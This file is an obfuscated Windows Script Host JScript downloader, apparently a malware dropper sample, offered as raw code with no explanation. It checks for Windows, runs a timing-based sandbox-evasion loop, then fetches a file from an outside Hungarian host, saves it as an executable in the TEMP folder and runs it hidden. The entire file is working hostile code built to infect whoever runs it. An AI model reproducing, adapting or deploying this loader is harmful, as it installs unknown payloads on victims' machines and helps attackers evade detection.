var HN = false;
var L0 = "Create"+"Object";
var I = function F() {return WScript[L0]("WScript"+".Shell");}(), H = 11;
var V = "MSXML2"+".XMLHTTP";
var F0 = 2;
var OZ = F0 - 2;
function MB(O){I["Run"](O, OZ, OZ);};
function LH(){return V + "";};
function GK(F1, T0){OZ = OZ * 1; return F1 - T0;};
function RJ(){return L0;};
/*@cc_on
  @if (@_win32 || @_win64)
    HN = true;
  @end
@*/
if (HN)
{
var UN = "";
function XK(){return 22;};
var N0 = 0; var S = 0;
function L()
{
var A = new this["Date"]();
var Z = A["getUTCMilliseconds"]();
WScript["Sleep"](XK());
var A = new this["Date"]();
var T = A["getUTCMilliseconds"]();
WScript["Sleep"](XK());
var A = new this["Date"]();
var ZJ = A["getUTCMilliseconds"]();
var N0 = "ZN";
N0 = GK(T, Z);
var S = "MS";
S = GK(ZJ, T);
UN = "open";
return GK(N0, S);
}
var PC = false;
var BJ = false;
for (var CR = OZ; CR < XK() * 1; CR++){if (L() != OZ){
PC = true; 
S = "31" + 11 * N0 + S; 
BJ = true; 
break;
}}
function N() {return ((PC == true) && (PC == BJ)) ? 1 : OZ;};
if (PC && N() && BJ){
function Q() {return I["ExpandEnvironmentStrings"]("%TE"+"MP%/") + "puiL1A5ICx69RKC.ex" + "e";};
 GH = LH();
 SG = WScript[L0](GH);
 var TB = 1;
do { 
	for (;TB;){
	try {
		if (TB == 1)
		{
			SG[UN]("GET", "http://arcfestoheni.hu/n3usad", false);
			SG["send"]();
			OE = "Sleep";
			TB = 2;
		}
		WScript[OE](XK() + 120); 
		if (SG["readystate"] < 2 * 2) continue;
		TB = OZ;
		function Q0(E) {var FE = (1, 2, 3, 4, 5, E); return FE;};
		FQ = WScript[RJ()]("ADODB.Stream");
		GH = FQ;
		GH[UN]();
		GH["type"] = Q0(1);
		GH["write"](SG["ResponseBody"]);
		FQ["position"] = Q0(OZ);
		GH["Save" + "ToFile"](Q(), 2);
		FQ["cl"+"ose"]();
		AE = Q();
		MB(AE);
	} catch(MC){};};
}while (TB);
}
}

